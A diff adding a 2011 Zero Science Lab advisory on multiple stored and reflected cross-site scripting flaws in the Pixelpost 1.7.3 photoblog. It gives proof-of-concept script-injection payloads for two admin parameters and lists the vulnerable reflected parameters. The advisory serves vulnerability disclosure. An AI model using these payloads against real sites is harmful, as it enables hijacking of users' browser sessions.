@@ -1,0 +1,50 @@
+--------------------------------------------------------------------
+
+Pixelpost 1.7.3 Multiple Persistent Cross-Site Scripting Vulnerabilities
+
+Vendor: Pixelpost.org
+Product web page: http://www.pixelpost.org
+Affected version: 1.7.3
+
+Summary: Pixelpost is an open-source, standards-compliant, multi-lingual,
+fully extensible photoblog application for the web. Anyone who has web-space
+that meets the requirements can download and use Pixelpost for free!
+
+Desc: Pixelpost is vulnerable to multiple cross-site scripting vulnerabilities,
+stored and non-persistent (reflected). Attackers can exploit this weakness to
+execute arbitrary HTML and script code in a user's browser session.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab - http://www.zeroscience.mk
+
+Advisory ID: ZSL-2011-4991
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4991.php
+
+
+03.02.2011
+
+--------------------------------------------------------------------
+
+Stored XSS:
+
+
+GET variable: action="><script>alert(1)</script> (http://localhost/pixelpost_v1.7.3/admin/index.php)
+POST variable: category="><script>alert(1)</script> (http://localhost/pixelpost_v1.7.3/admin/index.php)
+
+--------------------------------------------------------------------
+--------------------------------------------------------------------
+
+Reflected XSS:
+
+
+POST vars: selectfcat, selectftag, selectfmon, findfid, numimg_pp, category, id
+
+GET var: page
+
+--------------------------------------------------------------------
